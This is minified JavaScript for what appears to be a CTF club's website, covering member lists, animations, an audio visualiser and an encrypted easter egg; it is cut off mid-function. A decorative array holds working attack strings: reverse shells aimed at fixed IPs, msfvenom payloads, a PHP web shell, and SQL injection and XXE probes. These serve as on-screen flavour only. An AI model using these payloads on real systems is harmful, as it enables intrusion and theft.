var TKCTF=(()=>{var F=(e,t,o)=>new Promise((n,i)=>{var s=r=>{try{c(o.next(r))}catch(l){i(l)}},a=r=>{try{c(o.throw(r))}catch(l){i(l)}},c=r=>r.done?n(r.value):Promise.resolve(r.value).then(s,a);c((o=o.apply(e,t)).next())});function nt(){let e=document.getElementById("dataStreams"),t=window.innerWidth<768,o=t?4:20,n=["0x4D5A90000300000004000000FFFF0000B800000000000000400000","GET /api/security HTTP/1.1",`POST /login HTTP/1.1
Content-Type: application/json`,`Connection: keep-alive
Authorization: Bearer eyJ0eXAi`,"SELECT * FROM users WHERE id = ?","UNION SELECT username,password FROM admin","INSERT INTO logs (timestamp, event) VALUES","nmap -sS -O target.com","hydra -l admin -P passwords.txt ssh://target","john --wordlist=rockyou.txt hash.txt",'sqlmap -u "http://target.com/login.php"',"python3 exploit.py --target 192.168.1.100","U2VjcmV0OiBCR00gT04gKyBkaXYgRm9vdGVyIOKGk+KGk+KGkw==","use exploit/multi/handler","set PAYLOAD windows/x64/meterpreter/reverse_tcp","msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f elf -o reverse.elf","ncat.exe%20112.34.55.67%204444%20-e%20cmd","/bin/bash -i >& /dev/tcp/112.34.55.67/4444 0>&1","nc -lvnp 4444",'msfconsole -q -x "use exploit/multi/handler"','curl -X POST -d "username=admin&password=123"','wireshark -i eth0 -f "tcp port 80"',"tcpdump -i any -w capture.pcap","openssl s_client -connect target.com:443","ssh-keygen -t rsa -b 4096","gpg --gen-key --default-new-key-algo rsa4096","hashcat -a 0 -m 1000 hashes.txt wordlist.txt","aircrack-ng -w wordlist.txt capture.cap","dirb http://target.com/ /usr/share/wordlists/","gobuster dir -u http://target.com -w wordlist.txt",'<script>alert("XSS")<\/script>',"../../../../etc/passwd","{{7*7}}[[7*7]]",'<?php system($_GET["cmd"]); ?>','eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7"))',"LDAP injection: *)(&(objectClass=*)",'XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',"' OR '1'='1' --","'; DROP TABLE users; --","' UNION SELECT NULL,username,password FROM admin --","1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --","masscan -p1-65535 --rate=1000 192.168.1.0/24","nmap -sV -sC -A target.com","nmap --script vuln target.com","nikto -h http://target.com","whatweb http://target.com","fierce -dns target.com","dnsrecon -d target.com -t brt","sublist3r -d target.com","medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh","patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt","crackmapexec smb 192.168.1.0/24 -u admin -p password123","wpscan --url http://target.com --enumerate u,p","use auxiliary/scanner/smb/smb_version","use exploit/windows/smb/ms17_010_eternalblue","set RHOSTS 192.168.1.100","exploit -j","search cve:2021-44228","use post/windows/gather/hashdump","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.87 LPORT=443 -f exe -o payload.exe","msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f raw > shell.php","msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f war > shell.war",`python -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.0.87',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"`,`php -r "$sock=fsockopen('10.10.0.87',4444);exec('/bin/sh -i <&3 >&3 2>&3');"`,`ruby -rsocket -e"f=TCPSocket.open('10.10.0.87',4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)"`,`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.0.87',4444);"`,"ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//","arpspoof -i eth0 -t 192.168.1.100 192.168.1.1","responder -I eth0 -rdw","mitmdump -s script.py","hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a","john --format=NT hashes.txt","ophcrack -t tables/ -f hashes.txt","fcrackzip -D -p rockyou.txt archive.zip","airodump-ng wlan0mon","aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon","aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap","wifite --kill","kismet -c wlan0","ffuf -w wordlist.txt -u http://target.com/FUZZ","dirsearch -u http://target.com -e php,html,js","feroxbuster -u http://target.com -w wordlist.txt","wfuzz -w wordlist.txt http://target.com/FUZZ",'sqlmap -u "http://target.com/page.php?id=1" --dbs','sqlmap -u "http://target.com/page.php?id=1" --dump-all','sqlmap -u "http://target.com/page.php?id=1" --os-shell',"NoSQLMap -t mongodb://target.com:27017","setoolkit","gophish server --listen 0.0.0.0:3333","beef-xss","shellphish","mimikatz # sekurlsa::logonpasswords","bloodhound-python -d domain.local -u user -p pass -gc dc.domain.local -c all","winpeas.exe","linpeas.sh","privilege escalation: sudo -l","find / -perm -u=s -type f 2>/dev/null",'tshark -i eth0 -f "tcp port 80" -w capture.pcap',"tcpflow -i eth0 -c","dsniff -i eth0","urlsnarf -i eth0","volatility -f memory.dump imageinfo","autopsy case.db",'grep -r "error" /var/log/',"logstash -f config.conf","steghide embed -cf image.jpg -ef secret.txt","binwalk -e firmware.bin","strings binary | grep -i password","hexdump -C file.bin | head -20","burpsuite --config-file=config.json","postman collection run security-tests.json","owasp-zap-cli quick-scan --self-contained http://target.com",'curl -X GET "http://target.com/api/users" -H "Authorization: Bearer token123"'];for(let i=0;i<o;i++){let s=document.createElement("div");s.className="data-stream";let a=n[Math.floor(Math.random()*n.length)];s.textContent=a;let c=Math.random()*window.innerWidth,r=t?(Math.random()-.5)*30:(Math.random()-.5)*100,l=Math.random()*8;s.style.left=c+"px",s.style.setProperty("--drift-x",r+"px"),s.style.animationDelay=`-${l}s`,e.appendChild(s)}gt()}function gt(){let e=document.getElementById("dataStreams"),o=window.innerWidth<768?Math.floor(8*.2):8;for(let n=0;n<o;n++){let i=document.createElement("div");i.className="binary-stream";let s="";for(let r=0;r<80;r++)s+=Math.random()>.5?"1":"0",r%8===7&&(s+=" ");i.textContent=s;let a=Math.random()*window.innerHeight,c=Math.random()*20;i.style.top=a+"px",i.style.animationDelay=`-${c}s`,e.appendChild(i)}}function yt(e){let t=document.querySelector(e);if(t){let o=document.querySelector("nav"),n=t.querySelector("h2"),i=o?o.offsetHeight:0,s=n?n.offsetHeight:0,a=i+s,r=t.getBoundingClientRect().top+window.pageYOffset-a;window.scrollTo({top:r,behavior:"smooth"})}}document.querySelectorAll('nav a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault(),yt(this.getAttribute("href"))})});function st(){let e=window.innerHeight,t=e*.7,n=window.innerWidth<768?[".president-item",".president-members","#friendsList"]:[".president-item",".contact-item","#friendsList",".president-members",".member-row",".role-tag",".code-name"];document.querySelectorAll(".content-section").forEach((s,a)=>{if(s.classList.contains("fade-in-visible"))return;let c=s.getBoundingClientRect().top,r=s.getBoundingClientRect().height,l=e*.85,d=r*.05;if(c<l-d&&c>-r){let g=a*100;setTimeout(()=>{s.style.opacity="1",s.style.transform="translateY(0)",s.classList.add("fade-in-visible"),s.style.transition="opacity 1.5s ease, transform 1.5s ease"},g)}}),n.forEach(s=>{document.querySelectorAll(s).forEach((c,r)=>{if(c.classList.contains("fade-in-visible"))return;let l=c.getBoundingClientRect().top,d=c.getBoundingClientRect().height,m=d*.05;if(l<e-m&&l>-d){let p=r*50;setTimeout(()=>{c.style.opacity="1",c.style.transform="translateY(0)",c.classList.add("fade-in-visible"),c.id},p)}})})}function wt(){let e=document.getElementById("backToTop"),t=document.querySelector("footer");if(!e)return;let o=window.pageYOffset||document.documentElement.scrollTop,n=t?t.getBoundingClientRect().top+window.pageYOffset:1/0,i=window.innerHeight,s=window.innerWidth<768,a=s?20:30,c=s?45:50;if(o>200)if(e.classList.add("show"),o+i-c-a+c+10>n){let l=o+i-n+10;e.style.bottom=l+"px"}else e.style.bottom=a+"px";else e.classList.remove("show")}function bt(){window.scrollTo({top:0,behavior:"smooth"})}function vt(){return F(this,null,function*(){try{let t=yield(yield fetch("./data/members.json")).json();Tt(t.presidents),xt(t.members)}catch(e){console.error("\u52A0\u8F7D\u6210\u5458\u6570\u636E\u5931\u8D25:",e)}})}function Et(){return F(this,null,function*(){try{let t=yield(yield fetch("./data/friends.json")).json();Ct(t.friends)}catch(e){console.error("\u52A0\u8F7D\u53CB\u94FE\u6570\u636E\u5931\u8D25:",e)}})}function Tt(e){let t=document.getElementById("presidentsList");if(!t)return;let o=Object.keys(e).sort((n,i)=>n-i);t.innerHTML="",o.forEach((n,i)=>{let s=e[n];if(!s)return;let a=document.createElement("div");a.className="president-item",a.style.opacity="0",a.style.transform="translateY(30px)",a.style.transition="opacity 0.6s ease, transform 0.6s ease",a.style.animationDelay=`${i*300}ms`;let c=document.createElement("div");c.className="president-year",c.textContent=`${n}\u5C4A\u625B\u628A\u5B50`,a.appendChild(c);let r=document.createElement("div");r.className="president-names",a.appendChild(r);let l=document.createElement("div");if(l.className="achievements",l.innerHTML=s.achievements||"\u4E3B\u8981\u6210\u5C31\uFF1A\u6682\u65E0\u8BB0\u5F55",a.appendChild(l),!s.members||s.members.length===0){let d=document.createElement("span");d.className="unknown-member",d.innerHTML='> Error: Permission denied\uFF08\u7EC6\u8282\u6709\u5F85\u8003\u8BC1\uFF09<span class="blinking-cursor">_</span>',r.appendChild(d)}else{let d=document.createElement("div");d.className="president-members",d.style.opacity="0",d.style.transform="translateY(30px)",d.style.transition="opacity 0.6s ease, transform 0.6s ease",s.members.forEach((m,g)=>{let p=document.createElement("div");p.className="member-row",p.style.animationDelay=`${g*.1}s`,p.style.opacity="0",p.style.transform="translateY(30px)",p.style.transition="opacity 0.6s ease, transform 0.6s ease";let k=document.createElement("span");k.className="member-name",k.textContent=m.name,p.appendChild(k),m.roles.forEach(R=>{let E=document.createElement("span"),V;W(R)?V=Bt(R):V=D(R),E.className=`role-tag ${V}`,E.textContent=R,window.innerWidth<768?(E.style.opacity="1",E.style.transform="translateY(0)",E.style.transition="none"):(E.style.opacity="0",E.style.transform="translateY(30px)",E.style.transition="opacity 0.6s ease, transform 0.6s ease"),Mt(m.roles)&&!W(R)&&It(E,m.roles),p.appendChild(E)});let h=document.createElement("span");!m.codeName||m.codeName.trim()===""?(h.className="code-name null",h.textContent="Error: code-name not found"):(h.className="code-name",St(h,m.codeName)),window.innerWidth<768?(h.style.opacity="1",h.style.transform="translateY(0)",h.style.transition="none"):(h.style.opacity="0",h.style.transform="translateY(30px)",h.style.transition="opacity 0.6s ease, transform 0.6s ease"),p.appendChild(h),d.appendChild(p)}),r.appendChild(d)}t.appendChild(a)})}function xt(e){let t=document.getElementById("membersList");if(!t)return;let o=Object.keys(e).sort((n,i)=>i-n);t.innerHTML="",o.forEach((n,i)=>{let s=e[n];if(!s)return;let a=document.createElement("div");a.className="member-group";let c=document.createElement("div");c.className="member-year",c.textContent=`${n}\u5C4A`,a.appendChild(c);let r=document.createElement("div");r.className="member-list",s.length===0?r.textContent="\uFF08\u5F85\u8865\u5145\uFF09":r.textContent=s.join("\u3001"),a.appendChild(r),t.appendChild(a)})}function Ct(e){let t=document.getElementById("friendsList");if(!t)return;let o=e.map(n=>`<a href="${n.url}" target="_blank">${n.name}</a>`);t.innerHTML=`<p>${o.join("\u3001")}</p>`,t.style.opacity="0",t.style.transform="translateY(30px)",t.style.transition="opacity 0.6s ease, transform 0.6s ease"}function St(e,t){let o=t.includes("/")?t.split("/"):[t],n=0,i=!0,s="",c=window.innerWidth<768?6e3:2500;function r(){let l=o[n].trim();i?s.length<l.length?(s=l.substring(0,s.length+1),e.textContent=s,setTimeout(r,100+Math.random()*100)):setTimeout(()=>{i=!1,r()},c):s.length>0?(s=s.substring(0,s.length-1),e.textContent=s,setTimeout(r,50)):(n=(n+1)%o.length,i=!0,setTimeout(r,200))}r()}function W(e){let t=e.toLowerCase();return t.includes("\u7814\u53D1\u603B\u76D1")||t.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")}function D(e){let t=e.toLowerCase();return t.includes("\u6280\u672F")||t.includes("\u653B\u9632")?"tech":t.includes("\u884C\u653F\u8FD0\u8425")?"admin":t.includes("\u7ADE\u8D5B")?"competition":t.includes("\u5BA3\u4F20")?"promotion":"default"}function Bt(e){let t=e.toLowerCase();return t.includes("\u7814\u53D1\u603B\u76D1")?"director":t.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")?"teacher":"default"}function Mt(e){let t=e.filter(n=>!W(n)),o=new Set;return t.forEach(n=>{if(n.includes("/"))n.split("/").forEach(s=>{let a=D(s.trim());o.add(a)});else{let i=D(n);o.add(i)}}),o.size>1}function Lt(e){let t={tech:"#4a36ff",admin:"#11ffff",competition:"#ffbe32",promotion:"#ff9ff3",default:"#39b8eb"},o=new Set;return e.filter(i=>!W(i)).forEach(i=>{if(i.includes("/"))i.split("/").forEach(a=>{let c=D(a.trim());o.add(t[c])});else{let s=D(i);o.add(t[s])}}),Array.from(o)}function It(e,t){let o=Lt(t);if(o.length<=1)return;let n=o.map((i,s)=>{let a=s/(o.length-1)*100;return`${i} ${a}%`}).join(", ");e.style.background=`linear-gradient(135deg, ${n})`,e.style.border="1px solid rgba(255, 255, 255, 0.4)",e.style.boxShadow="0 0 20px rgba(255, 255, 255, 0.5)"}document.addEventListener("DOMContentLoaded",function(){nt();let e=window.innerWidth<768;[".content-section",".president-item",".president-members",".role-tag",".code-name"].forEach(a=>{document.querySelectorAll(a).forEach(r=>{e&&(a===".role-tag"||a===".code-name")?(r.style.opacity="1",r.style.transform="translateY(0)",r.style.transition="none"):(r.style.opacity="0",r.style.transform="translateY(30px)",r.style.transition="opacity 0.6s ease, transform 0.6s ease")})}),st(),vt(),Et();let o=document.querySelector(".about-title");o&&setTimeout(()=>{o.classList.add("loaded")},100);let n=document.getElementById("backToTop");n&&n.addEventListener("click",bt);let s="ontouchstart"in window||navigator.maxTouchPoints>0?20:150});var kt=0;var I=!1,x=0,it=1,G=!1,$=!1,U=0,Ht=2e3;function At(){let e=document.getElementById("mainFooter");if(!e||I)return;let t=document.getElementById("bgmAudio");if(!t||t.paused)return;let o=window.pageYOffset||document.documentElement.scrollTop,n=e.offsetTop,i=window.innerHeight,s=document.documentElement.scrollHeight,a=o+i>=s-1,c=o+i>=n+e.offsetHeight;a&&c&&Ot()}function at(){let e=document.getElementById("mainFooter");if(!e)return!1;let t=window.pageYOffset||document.documentElement.scrollTop,o=e.offsetTop,n=window.innerHeight,i=document.documentElement.scrollHeight;if("ontouchstart"in window||navigator.maxTouchPoints>0){let a=t+n>=i-20,c=t+n>=o-50;return a&&c}else{let a=t+n>=i-1,c=t+n>=o+e.offsetHeight;return a&&c}}function Rt(e){let t=document.getElementById("mainFooter");if(!t)return;let o=document.getElementById("bgmAudio");if(!o||o.paused)return;let n=window.pageYOffset||document.documentElement.scrollTop,i=t.offsetTop,s=window.innerHeight,a=document.documentElement.scrollHeight,c=n+s>=a-1,r=n+s>=i+t.offsetHeight;c&&r&&(e.deltaY>0?I||(e.preventDefault(),rt(0)):e.deltaY<0&&(I?(e.preventDefault(),lt()):x>0&&(e.preventDefault(),ct())))}function Nt(e){let t=document.getElementById("particleContainer");if(!t)return;let o=Math.min(5+e*2,30);for(let n=0;n<o;n++){let i=document.createElement("div");i.className="particle",i.style.left=Math.random()*100+"%",i.style.animationDelay=Math.random()*2+"s",i.style.animationDuration=2+Math.random()*2+"s";let s=2+e*.5;i.style.width=s+"px",i.style.height=s+"px";let a=.5+e*.05;i.style.boxShadow=`0 0 ${10+e}px #00e4ff, 0 0 ${20+e*2}px #00e4ff, 0 0 ${30+e*3}px #00e4ff`,t.appendChild(i),setTimeout(()=>{i.parentNode&&i.parentNode.removeChild(i)},3e3)}}function Ot(){G||(G=!0,Nt(1),setTimeout(()=>{G=!1},100))}function rt(e){if(!document.getElementById("mainFooter"))return;$&&(x=0,$=!1),x++;let n="ontouchstart"in window||navigator.maxTouchPoints>0?20:150;x>=n?Pt():x/n>=.01&&Dt()}function ct(){let e=document.getElementById("mainFooter");if(!e)return;it=1,e.style.borderTopWidth="1px",x=0,$=!0,document.querySelectorAll(".persistent-glow").forEach(n=>n.remove());let o=document.getElementById("dataStreams");o&&(o.style.transition="opacity 1s ease-in",o.style.opacity="1")}function Dt(){let e=document.getElementById("persistentGlow");if(e){Ft(e);return}let t=document.createElement("div");t.id="persistentGlow",t.className="persistent-glow";let o=window.innerWidth<768,i="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,s=Math.min(x/i,1),a=o?15:20,r=a+(135-a)*s,l=o?.4:.6,m=l+(.9-l)*s;if(t.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: ${r}px;
        background: linear-gradient(to top, rgba(0, 228, 255, ${m}), transparent);
        z-index: 1000;
        will-change: opacity, transform;
        animation: persistentGlow 2s ease-in-out infinite;
        pointer-events: none;
    `,document.body.appendChild(t),o){let g=document.getElementById("dataStreams");g&&(g.style.transition="opacity 1s ease-out",g.style.opacity="0")}}function Ft(e){let t=window.innerWidth<768,n="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,i=Math.min(x/n,1),s=t?15:20,c=s+(135-s)*i,r=t?.4:.6,d=r+(.9-r)*i;e.style.height=`${c}px`,e.style.background=`linear-gradient(to top, rgba(0, 228, 255, ${d}), transparent)`}function Pt(){I=!0;let e=document.getElementById("easterEgg"),t=document.getElementById("mainFooter");if(!e)return;t&&(t.style.display="none");let o=document.getElementById("persistentGlow");o&&(o.style.display="none");let n=document.getElementById("dataStreams");n&&(n.style.transition="opacity 1s ease-in",n.style.opacity="1"),jt(),e.classList.add("show"),e.scrollIntoView({behavior:"smooth"}),se()}function qt(){let e=["IUAj","S2V5","U2VjcmV0","MjAyNQ==","Q1RG","VEs="],t=Object.assign({},{"!":"A","@":"B","#":"C",T:"D",K:"E",C:"F",F:"G",2:"H",0:"I",5:"J",S:"K",e:"L",c:"M",r:"N",t:"O"},{K:"P",e:"Q",y:"R","!":"S","@":"T"}),o=[];for(let a of e)o.push(atob(a));let n=o.join(""),i={};for(let[a,c]of Object.entries(t))i[c]=a;let s="";for(let a of n)s+=i[a]||a;return s}function Yt(e){try{let t=qt(),n=CryptoJS.AES.decrypt(e,t).toString(CryptoJS.enc.Utf8);if(!n)throw new Error("\u89E3\u5BC6\u5931\u8D25\u6216\u5BC6\u94A5\u9519\u8BEF");return n}catch(t){throw console.error("\u89E3\u5BC6\u5931\u8D25:",t),t}}function jt(){return F(this,null,function*(){let e=document.getElementById("cardContent");if(e)try{let t=yield fetch("./data/Card.encrypted");if(!t.ok)throw new Error("Failed to load encrypted card content");let o=yield t.text(),n=Yt(o);e.innerHTML=n,J()}catch(t){console.error("\u52A0\u8F7D\u6216\u89E3\u5BC6\u5361\u7247\u5185\u5BB9\u5931\u8D25:",t),e.innerHTML='<div class="card-container" id="cardContainer"><div class="card" id="card"><div class="card-front"><img src="./img/TKCTF512.svg" alt="TKCTF Logo" class="card-logo"></div><div class="card-back"><div class="card-content"><h4>\u5173\u4E8E\u672C\u7F51\u7AD9</h4><p>\u5185\u5BB9\u52A0\u8F7D\u5931\u8D25</p></div></div></div></div>',J()}})}function lt(){I=!1,kt=0,x=0,it=1,$=!1;let t="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,o=document.getElementById("easterEgg"),n=document.getElementById("mainFooter");if(!o)return;o.classList.remove("show");let i=document.getElementById("cardContent");i&&(i.innerHTML=""),ht();let s=document.getElementById("persistentGlow");s&&s.remove();let a=document.getElementById("dataStreams");a&&(a.style.transition="opacity 1s ease-in",a.style.opacity="1"),n&&(n.style.display="",n.style.borderTopWidth="1px"),n&&n.scrollIntoView({behavior:"smooth"})}function J(){let e=document.getElementById("card");e&&e.addEventListener("click",function(){e.classList.contains("flipped")?e.classList.remove("flipped"):e.classList.add("flipped")})}window.addEventListener("scroll",()=>{wt(),st(),At(),Wt()});function Wt(){if(!document.getElementById("mainFooter")||I)return;let t=document.getElementById("bgmAudio");!t||t.paused||at()&&ne()}window.addEventListener("wheel",Rt,{passive:!1});var N=0,O=0,dt=0,mt=0,ut=!1;window.addEventListener("touchstart",function(e){N=e.touches[0].clientY,dt=Date.now(),ut=!1},{passive:!0});window.addEventListener("touchmove",function(e){ut=!0},{passive:!0});window.addEventListener("touchend",function(e){if(O=e.changedTouches[0].clientY,mt=Date.now(),I){N<O&&lt();return}let t=document.getElementById("bgmAudio");!t||t.paused||!document.getElementById("mainFooter")||setTimeout(()=>{$t()},100)},{passive:!0});function $t(){if(!document.getElementById("mainFooter"))return;let t=Math.abs(O-N),o=mt-dt;if(N<O&&t>5&&o<2e3)x>0&&ct();else if(at()){let n=window.innerHeight*.45;N>O&&t>n&&o<500&&rt(0)}}var b=!1,v=null,f=null,y=null,S=[];var Q=0,C=null,Y=null,B=!1,u=null,Z=null,T=null,L=!1,z=0,_=0,P=0,q=0,tt=0,H=[],M=!1;function Vt(){try{v=new(window.AudioContext||window.webkitAudioContext);let e=document.getElementById("bgmAudio"),t=v.createMediaElementSource(e);f=v.createAnalyser(),f.fftSize=2048,f.smoothingTimeConstant=.8;let o=f.frequencyBinCount;return y=new Uint8Array(o),t.connect(f),f.connect(v.destination),Gt(),!0}catch(e){return!1}}function Gt(){if(!window.Worker){console.warn("Web Worker not supported, falling back to main thread"),B=!1;return}try{let e=(window.location.hostname==="localhost"||window.location.hostname==="127.0.0.1","./src/spectrum-worker.js");C=new Worker(e),B=!0,C.onmessage=function(t){let{type:o,data:n}=t.data;switch(o){case"initComplete":C.postMessage({type:"config",data:{fftSize:f.fftSize,sampleRate:v.sampleRate,beatThreshold:188,beatCooldown:25,heavyBeatCooldown:120}});break;case"processedSpectrumData":Y=n;break;case"error":console.error("Spectrum worker error:",n);break;case"workerStopped":break}},C.onerror=function(t){console.error("Spectrum worker error:",t),B=!1},C.postMessage({type:"init",data:{fftSize:f.fftSize,sampleRate:v.sampleRate}})}catch(e){console.error("Failed to create spectrum worker:",e),B=!1}}function zt(){let e=document.getElementById("logo");fetch("./img/TKCTF512.svg").then(t=>t.text()).then(t=>{if(e.innerHTML=t,u=e.querySelector("svg"),u){u.id="logoSvg",u.style.width="100%",u.style.height="100%";let o=u.viewBox.baseVal,n=o.width||1e3;Z={T0:u.querySelector(".T0"),K:u.querySelector(".K"),C:u.querySelector(".C"),T1:u.querySelector(".T1"),F:u.querySelector(".F")};let i=u.querySelector("defs");i||(i=document.createElementNS("http://www.w3.org/2000/svg","defs"),u.insertBefore(i,u.firstChild));let s=document.createElementNS("http://www.w3.org/2000/svg","clipPath");s.id="progressClip",T=document.createElementNS("http://www.w3.org/2000/svg","rect"),T.setAttribute("x","0"),T.setAttribute("y","0"),T.setAttribute("width","0"),T.setAttribute("height",o.height||1e3),s.appendChild(T),i.appendChild(s);let a=document.createElementNS("http://www.w3.org/2000/svg","g");a.id="progressGroup",a.setAttribute("clip-path","url(#progressClip)"),Object.values(Z).forEach(c=>{if(c){c.style.fill="#010101";let r=c.cloneNode(!0);r.style.fill="#00a2ff",r.style.filter="drop-shadow(0 0 8px rgba(0, 162, 255, 0.8))",a.appendChild(r)}}),u.appendChild(a)}}).catch(t=>console.error("\u52A0\u8F7DSVG\u5931\u8D25:",t))}function _t(){let e=document.getElementById("logoContainer");e.addEventListener("mousemove",o=>{let n=e.getBoundingClientRect(),i=n.left+n.width/2,s=n.top+n.height/2;z=(o.clientX-i)/10,_=(o.clientY-s)/10}),e.addEventListener("mouseleave",()=>{z=0,_=0});function t(){if(P+=(z-P)*.15,q+=(_-q)*.15,!L&&Math.abs(P)>.1||Math.abs(q)>.1){let o=document.getElementById("logo");(o.style.transform||"").includes("scale")||(o.style.transform=`translate(${P}px, ${q}px)`)}requestAnimationFrame(t)}t()}function K(e){if(!u)return;let t=document.getElementById("logoContainer"),o=document.createElement("div");o.className="trail-particle";let n=u.cloneNode(!0);n.style.width="100%",n.style.height="100%",n.style.transform=`rotate(${e}deg)`,n.style.filter="drop-shadow(0 0 20px rgba(0, 255, 255, 0.9)) brightness(1.3)",o.appendChild(n),t.appendChild(o),setTimeout(()=>{o.style.opacity="0.6",o.style.transition="opacity 0.1s ease-out"},10),setTimeout(()=>{o.style.opacity="0",o.style.transition="opacity 0.3s ease-out"},100),setTimeout(()=>{o.remove()},400)}function Kt(e){let t=document.getElementById("logoContainer"),o=document.createElement("div");o.className="pulse-ring",o.style.width="120px",o.style.height="120px",o.style.border=`${3+e*2}px solid rgba(0, 255, 255, ${.9})`,o.style.boxShadow="0 0 30px rgba(0, 255, 255, 0.8), inset 0 0 30px rgba(0, 162, 255, 0.5)",o.style.animation="beatPulse 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards",t.appendChild(o),setTimeout(()=>o.remove(),800)}function Xt(){let e=document.getElementById("logoContainer"),t=document.createElement("div");t.className="wave-ring",t.style.width="120px",t.style.height="120px",e.appendChild(t),setTimeout(()=>t.remove(),320)}function Ut(){if(!f||!y||!b)return;f.getByteFrequencyData(y);let e=0,t=0;B&&Y?(e=Y.spectrumFeatures.totalEnergy,t=Y.spectrumFeatures.spectralCentroid):e=y.reduce((a,c)=>a+c)/y.length/255;let n=5+e*12,i=(Math.random()-.5)*(1+e*8);if(!M&&!L){let s=document.getElementById("logo"),a=(Math.random()-.5)*n,c=(Math.random()-.5)*n;s.style.transform=`translate(${a}px, ${c}px) rotate(${i}deg)`;let l=25+e*25,d=.6+e*.4;s.style.filter=`drop-shadow(0 0 ${l}px rgba(0, 162, 255, ${d}))`;let m=t>.5?.2:.25;e>m&&Math.random()>.75&&K(i)}}function et(e,t,o){return Math.round(e/(t/2)*(o/2))}function Jt(){if(!f||!y)return!1;f.getByteFrequencyData(y);let e=v.sampleRate,t=et(1500,e,f.fftSize),o=et(2250,e,f.fftSize),n=0,i=Math.max(1,o-t+1);for(let r=t;r<=o&&r<y.length;r++)n+=y[r];let s=n/i,a=188,c=Date.now();return s>a&&c-Q>25?(Q=c,!0):!1}function Qt(){if(!S.length)return!1;let e=Date.now(),t=S.length,o=Math.floor(t*.25),n=Math.floor(t*.45),i=S.slice(o,n),s=0;i.forEach(l=>{l.classList.contains("active")&&s++});let a=Math.max(1,Math.ceil(i.length*9/10)),c=s>=a;return H.push({time:e,isActive:c}),H=H.filter(l=>e-l.time<=100),H.filter(l=>l.isActive).length>0&&e-tt>300?(tt=e,!0):!1}function Zt(){let e=document.getElementById("bgmAudio");if(!e.duration||!T||!u)return;let t=e.currentTime/e.duration,n=u.viewBox.baseVal.width||1e3;T.setAttribute("width",n*t)}function ot(){let e=document.getElementById("binarySpectrum"),t=window.innerWidth<768,o,n;t?(o=Math.floor(window.innerWidth/24),n=16):(o=Math.floor(window.innerWidth/12),n=8),e.innerHTML="",S=[];for(let i=0;i<o;i++){let s=document.createElement("div");if(s.className="spectrum-bar",s.style.left=i*(100/o)+"%",s.style.height="0px",s.style.width=n+"px",!t){let a=document.createElement("div");a.className="binary-digits";let c="",r=Math.floor(Math.random()*12)+8;for(let l=0;l<r;l++)c+=Math.random()>.5?"1":"0";a.textContent=c,s.appendChild(a)}e.appendChild(s),S.push(s)}}function pt(){if(!f||!b)return;f.getByteFrequencyData(y),B&&C&&C.postMessage({type:"spectrumData",data:Array.from(y)});let e=v.sampleRate,t=document.getElementById("dataStreams"),o=document.getElementById("logoContainer"),n=document.getElementById("logo");b&&(t.classList.remove("glitch-beat"),t.classList.add("glitch-subtle"));let i=Qt(),s=Jt();i&&!M?(M=!0,o.classList.add("heavy-beats"),o.classList.add("activity"),Xt(),[-12,-8,-4,0,4,8,12].forEach((c,r)=>{setTimeout(()=>K(c),r*20)}),setTimeout(()=>{M=!1,o.classList.remove("heavy-beats"),o.classList.remove("activity")},200)):s&&!L&&!M&&(L=!0,o.classList.add("activity"),n.style.animation="beatScale 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards",[-8,-4,0,4,8].forEach((c,r)=>{setTimeout(()=>K(c),r*30)}),Kt(1),setTimeout(()=>{L=!1,n.style.animation="",o.classList.remove("activity")},400),isMobile||(t.classList.remove("glitch-subtle"),t.classList.add("glitch-beat"),setTimeout(()=>{b&&(t.classList.remove("glitch-beat"),t.classList.add("glitch-subtle"))},250))),Ut(),te(y),Zt(),b&&requestAnimationFrame(pt)}function te(e){if(!S.length)return;let t=S.length,o=Math.floor(e.length*.85),n=Math.floor(o/t);for(let i=0;i<t;i++){let s=i*n,a=e[s]||0,c=Math.max(5,a/255*100),r=S[i];if(r.classList.remove("stopping"),r.style.height=c+"px",!(window.innerWidth<768)&&(a>120?r.classList.add("active"):r.classList.remove("active"),Math.random()>.92)){let d=r.querySelector(".binary-digits"),m="",g=Math.floor(Math.random()*12)+8;for(let p=0;p<g;p++)m+=Math.random()>.5?"1":"0";d.textContent=m}}}function ft(){document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),S.forEach((t,o)=>{t.classList.add("stopping"),t.classList.remove("active"),setTimeout(()=>{t.style.height="0px",setTimeout(()=>{let n=t.querySelector(".binary-digits");n&&(n.textContent="")},400)},o*20)})}function A(e){let t=document.getElementById("audioStatus");switch(t.classList.remove("blink","show","hidden"),e){case"initial":t.textContent="\u70B9\u51FB LOGO \u64AD\u653E BGM",t.classList.add("blink");break;case"playing":t.classList.add("hidden");break;case"paused":t.textContent="\u70B9\u51FB LOGO \u7EE7\u7EED\u64AD\u653E",t.classList.add("show");break;default:t.classList.add("hidden")}}function ee(){let 